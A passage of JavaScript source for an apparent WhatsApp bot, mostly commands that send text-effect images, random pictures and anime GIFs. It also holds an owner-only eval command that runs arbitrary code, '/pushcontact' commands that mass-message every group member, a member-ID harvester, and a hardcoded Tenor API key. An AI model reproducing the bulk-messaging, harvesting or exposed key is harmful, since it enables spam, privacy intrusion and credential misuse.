case '/carbon':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '/whitebear':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${q}`,])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '/metallic':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
maker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
    `${q}`,])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '/steel':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
maker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
    `${q}`,])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '/fabric':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
maker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
    `${q}`,])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '/ancient':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
maker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
    `${q}`,])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '/marvel':
if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
ZeroStickWait()
maker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
    `${q}`,])
  .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '/aesthetic':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/antiwork':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/blackpink':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/bike':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/boneka':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/cosplay':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/cat':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/doggo':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/justina':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/kayes':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/kpop':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/notnot':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/car':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/couplepic':case '/couplepicture':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/profilepic':  case '/profilepicture':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/pubg':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/rose':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/ryujin':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/ulzzangboy':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/ulzzanggirl':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/wallml': case '/wallpaperml':case '/mobilelegend':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/wallpaperphone': case '/wallphone':
ZeroStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case '/animewallpaper2': case '/animewall2': {
                if (!args.join(" ")) return replygcZero("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
                client.sendMessage(from, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break
case '/animewall': case '/animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replygcZero('What wallpaper do you want?')
ZeroStickWait()
const wall = new AnimeWallpaper()
    const pages = [1,2,3,4]
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null)
const i = Math.floor(Math.random() * wallpaper.length)    
            await client.sendMessage(from, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
                    return('Error!')
                })
//client.sendMessage(from,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case '/akira': case '/akiyama': case '/ana': case '/art': case '/asuna': case '/ayuzawa': case '/boruto': case '/bts': case '/chiho': case '/chitoge': case '/cosplay': case '/cosplayloli': case '/cosplaysagiri': case '/cyber': case '/deidara': case '/doraemon': case '/elaina': case '/emilia': case '/erza': case '/exo':  case '/gamewallpaper': case '/gremory': case '/hacker': case '/hestia': case '/hinata': case '/husbu': case '/inori': case '/islamic': case '/isuzu': case '/itachi': case '/itori': case '/jennie': case '/jiso': case '/justina': case '/kaga': case '/kagura': case '/kakasih': case '/kaori': case '/cartoon': case '/shortquote': case '/keneki': case '/kotori': case '/kurumi': case '/lisa': case '/loli': case '/madara': case '/megumin': case '/mikasa': case '/mikey': case '/miku': case '/minato': case '/mountain': case '/naruto': case '/neko': case '/nekonime': case '/nezuko': case '/onepiece': case '/pentol': case '/pokemon': case '/programming':  case '/randomnime': case '/randomnime2': case '/rize': case '/rose': case '/sagiri': case '/sakura': case '/sasuke': case '/satanic': case '/shina': case '/shinka': case '/shinomiya': case '/shizuka': case '/shota': case '/space': case '/technology': case '/tejina': case '/toukachan': case '/tsunade': case '/waifu': case '/yotsuba': case '/yuki': case '/yulibocil': case '/yumeko':{

ZeroStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/neko.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
client.sendMessage(from, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break

case '/>':
case '/=>':
if (!ZeroTheCreator) return ZeroStickOwner()
var err = new TypeError
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replygcZero(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replygcZero(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replygcZero(util.format(_syntax + _err))
}
break
case '/pushcontact': {
    if (!ZeroTheCreator) return ZeroStickOwner()
      if (!m.isGroup) return replygcZero(`The feature works only in grup`)
    if (!text) return replygcZero(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcZero(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    client.sendMessage(pler, { text: q})
     }  
     replygcZero(`Done`)
      }
      break
case "/pushcontactv2":{
if (!ZeroTheCreator) return ZeroStickOwner()
if (!q) return replygcZero(`Incorrect Usage Please Use Command Like This\n${prefixo+command} idgc|text`)
ZeroStickWait()
const metadata2 = await client.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
client.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcZero(`Success`)
}
break

            case '/id':{
            replygcZero(from)
           }
          break
          case '/userjid':{
          	if(!ZeroTheCreator) return ZeroStickOwner()
        const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replygcZero(textt)
    }
    break
          case '/emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replygcZero(`Example : ${prefixo + command} 😅+🤔`)
		if (!emoji2) return replygcZero(`Example : ${prefixo + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await client.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
	
case '/animeawoo':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animemegumin':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animeshinobu':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animehandhold':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animehighfive':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animecringe':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animedance':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animehappy':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animeglomp':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animesmug':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animeblush':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animewave':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animesmile':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animepoke':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animewink':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animebonk':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animebully':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animeyeet':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animebite':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animelick':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animekill':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animecry':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animewlp':{
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animekiss':{
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animehug':{
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
